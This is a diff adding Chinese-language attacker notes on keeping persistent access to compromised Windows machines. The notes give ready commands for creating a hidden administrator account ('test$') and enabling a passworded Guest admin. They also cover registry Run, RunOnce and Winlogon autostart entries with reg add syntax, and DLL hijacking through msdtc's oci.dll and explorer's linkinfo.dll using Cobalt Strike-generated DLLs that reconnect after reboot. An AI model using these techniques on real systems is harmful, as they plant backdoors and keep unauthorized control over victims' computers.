@@ -101,4 +101,109 @@ net user Guest /active:no	//禁用Guest账户
 
 
 
+权限维持：
+1.隐藏账户：
+a1：自建属于管理员组的隐藏账户：
+net user test$ akQwe123passwd /add && net localgroup admiistrators test$ /add
+
+a2：激活guest用户：
+net user guest kwzqQwe12Passwd && net localgroup admiistrators guest /add
+net user guest /active:yes
+
+
+2.注册表自启动：
+a1：Run项和RunOnce项：
+Run项和RunOnce表项在用户每次登录时运行。键名随便写，键值为可执行文件的绝对路径(不能超过260个字符)。
+Run项的值会一直存在，除非被主动删除。
+RunOnce表项其键值下的程序会在下一次重启时运行一次，再重启不会运行。
+
+若在RunOnce表项的键名加一个感叹号'!'，则表示该键值在其对应程序运行后删除。 若键名加一个星号'*'，则表示该键值对应的程序在系统安全模式下也可运行。
+
+此两项包含4个键：
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+
+
+其他注册表启动项：Winlogin键每次启动都会触发。
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+
+
+
+注册表自启动执行命令：
+reg add命令：返回值为0则成功，1为失败。
+reg add <keyname> [{/v Valuename | /ve}] [/t datatype] [/s Separator] [/d Data] [/f]
+
+keyname：指定子项的完全路径
+/v Valuename：指定项名(键名)
+/t datatype：指定数据类型，默认为REG_SZ
+/d Data：指定键值。
+/s Separator：指定分隔符。默认将"\0"作为分隔符。
+/f：不询问，强制修改注册表。
+
+eg1：
+reg add keynamez /v xianmgz /t REG_SZ /d "whoami" /f
+
+
+
+
+
+查看本机当前时间：
+net time \\127.0.0.1
+
+
+
+
+
+
+计划任务.
+
+
+
+dll劫持：推荐。
+msdtc启动时会加载oci.dll文件。该文件默认不存在。
+cs生成oci.dll文件->上传(一般在C:\Windows\System32目录下)。
+使用插件完成。
+不重启直接上线，重启也上线(不需登录)。
+
+
+
+
+msdtc.exe是微软分布式传输协调程序，调用和管理web、mssql程序。
+依赖于RPC协议(默认端口135)。
+
+启动msdtc服务：
+net start msdtc
+
+查找对应的PID：
+tasklist | findstr "msdtc.exe"
+
+
+
+
+
+
+eg2：linkinfo.dll
+explorer.exe程序会加载该dll文件。
+cs生成linkinfo.dll文件->上传(一般在C:\Windows目录下)。
+使用插件完成。 上线成功。
+
+
+
+
+
+
+wmi注册事件(其触发时执行)维权。
+
+
+
+
+服务自启动.
+
+
+
 
